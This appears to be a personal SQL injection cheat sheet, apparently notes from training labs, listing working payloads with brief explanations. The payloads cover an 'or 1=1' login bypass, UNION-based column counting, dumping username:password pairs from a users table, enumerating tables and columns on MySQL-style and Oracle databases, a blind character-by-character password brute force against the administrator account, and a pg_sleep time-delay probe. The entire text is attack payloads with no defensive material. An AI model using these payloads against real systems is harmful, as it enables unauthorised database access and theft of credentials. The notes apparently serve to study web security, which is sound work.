`asd' or 1 = 1;#`  

`asd' UNION SELECT NULL,NULL,NULL;#` - to define column number (each null for a column, will error until null count will not match column count, it can be `---` instead of `#`)

`asd' UNION SELECT NULL, 'a', NULL;#` - to find string columns, if there is no error after this query then second('a') column returns string values

`asd' UNION SELECT * FROM table;#` - to retrieve info from other tables
`'UNION+SELECT+NULL,username||':'||password+FROM+users--` - select in single column

`UNION+SELECT+NULL,table_name+FROM+information_schema.tables--` - get tables
`UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name+=+'users_wmfnpt'--` - get columns

`'UNION+SELECT+NULL,table_name+FROM+all_tables--` - get tables from oracle db
`'UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_LOSBQQ'--` - get columns from oracle db

`'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='b'--` - blind sql password bruteforce

`'||pg_sleep(10)--` - time delays
![[SQLCheatSheet1.png]]
![[SQLCheatSheet2.png]]
![[SQLCheatSheet3.png]]
![[SQLCheatSheet4.png]]
![[SQLCheatSheet5.png]]
![[SQLCheatSheet6.png]]
